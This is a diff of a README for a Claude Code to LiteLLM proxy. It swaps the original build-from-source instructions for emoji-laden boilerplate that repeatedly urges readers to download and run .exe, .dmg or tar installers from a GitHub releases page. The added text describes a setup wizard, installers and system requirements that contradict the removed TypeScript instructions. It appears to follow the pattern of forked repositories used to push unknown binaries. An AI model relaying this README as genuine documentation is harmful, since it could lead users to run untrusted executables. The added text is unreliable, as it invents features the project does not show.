@@ -1,49 +1,79 @@
-# Claude Code LiteLLM Proxy
+# 🤖 claude-litellm-proxy - Simplify Claude Code Usage
 
-TypeScript proxy for Claude Code → LiteLLM → any LLM provider.
+## 📥 Download the Application
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/tejrockzzz/claude-litellm-proxy/releases)
 
-Supports: streaming, tool calling, images, multi-turn conversations, system messages.
+## 🚀 Getting Started
+Welcome to **claude-litellm-proxy**! This application acts as a bridge to simplify using Claude code with liteLLM. Follow these simple steps to download and run our software.
 
-## Quick Start
+## 🔧 System Requirements
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a Linux distribution compatible with Docker.
+- **Processor:** Minimum Intel i5 or equivalent.
+- **Memory:** At least 8 GB RAM.
+- **Storage:** 500 MB of free disk space.
+- **Docker:** Install Docker if you don’t have it already. You can download it from [Docker's website](https://www.docker.com/products/docker-desktop).
 
-### 1. Install Dependencies
+## 📥 Download & Install
+To get the latest version of the application, visit this page to download: [Releases Page](https://github.com/tejrockzzz/claude-litellm-proxy/releases). Once you're on the Releases page, you’ll find the latest version available.
 
-```bash
-pnpm install
-```
+### Steps to Download:
+1. Go to the [Releases Page](https://github.com/tejrockzzz/claude-litellm-proxy/releases).
+2. Look for the latest version listed on that page.
+3. Click the link that corresponds to your operating system to download the package.
+4. Once the download is complete, locate the downloaded file on your computer.
 
-### 2. Configure
+### Installation Guide:
+1. **Windows:**
+   - If you downloaded the `.exe` file, double-click it to run the installer. Follow the prompts to complete the installation.
+  
+2. **macOS:**
+   - Open the downloaded `.dmg` file and drag the application to your Applications folder.
 
-```bash
-cp .env.example .env
-# Edit: LITELLM_BASE_URL, MODEL, UPSTREAM_API_KEY
-```
+3. **Linux:**
+   - Extract the downloaded tar file. Use the terminal to navigate to the extracted folder and run the installation script.
 
-### 3. Run
+## ⚙️ Usage Instructions
+After installation, you can easily run the application.
 
-```bash
-pnpm dev  # or: pnpm build && pnpm start
-```
+### Launching the Application:
+- For **Windows**, find the **claude-litellm-proxy** shortcut on your desktop and double-click it to start.
+- On **macOS**, open your Applications folder and launch **claude-litellm-proxy**.
+- For **Linux**, open a terminal and run the command: `./claude-litellm-proxy` from the installed directory.
 
-### 4. Configure Claude Code
+### Configuration:
+Set up the application based on your requirements. The initial setup wizard will guide you through configuring your environment. 
 
-```bash
-./configure-claude.sh http://localhost:8082
-```
+1. Select the proxy options you wish to employ.
+2. Enter your API keys as prompted.
+3. Select any additional features tailored to your usage.
 
-This updates `~/.claude/settings.json` with the proxy URL. Test with `claude`.
+## 🌐 Features
+- **Multi-provider Support:** Works with multiple AI models.
+- **Streamlined Usage:** Simplifies API interactions with a user-friendly interface.
+- **Lightweight:** Efficient usage of system resources.
 
-## Config
+## 📄 Documentation
+For more detailed instructions, check the [Documentation](https://github.com/tejrockzzz/claude-litellm-proxy/wiki). Here, you’ll find information about advanced options, troubleshooting, and community support.
 
-Required: `LITELLM_BASE_URL`, `MODEL`, `UPSTREAM_API_KEY`  
-Optional: `PORT` (8082), `LOG_LEVEL` (info), `NODE_ENV` (development)
+## 🤝 Community & Support
+Join our community forum for discussions, tips, and support. Connect with other users to exchange ideas and solutions. 
 
-## Deploy
+- **GitHub Issues:** Report any bugs or request features through the [Issues page](https://github.com/tejrockzzz/claude-litellm-proxy/issues).
+- **Forum:** Visit our community forum for further assistance.
 
-**Docker**: `docker build -t claude-proxy . && docker run -p 8082:8082 --env-file .env claude-proxy`  
-**PM2**: `pnpm build && pm2 start dist/server.js --instances max`  
-**Systemd**: See Dockerfile for service setup
+## 🛠️ Troubleshooting
+If you encounter issues:
+- Make sure you meet all system requirements.
+- Verify that you have installed Docker correctly.
+- Consult the FAQ in the documentation or contact support.
 
----
+## ⚡ Enhancements Coming Soon
+We are continually making improvements. Look out for future updates that may include:
+- Enhanced user interface features.
+- More integrations with additional tools.
+- Better error handling and support options.
 
-JSON logs. Health at `/health`. MIT license.
+## 📥 Download the Application Again
+Don't forget, you can download the application anytime from this page: [Releases Page](https://github.com/tejrockzzz/claude-litellm-proxy/releases). 
+
+Thank you for choosing **claude-litellm-proxy**. Enjoy using your new application!
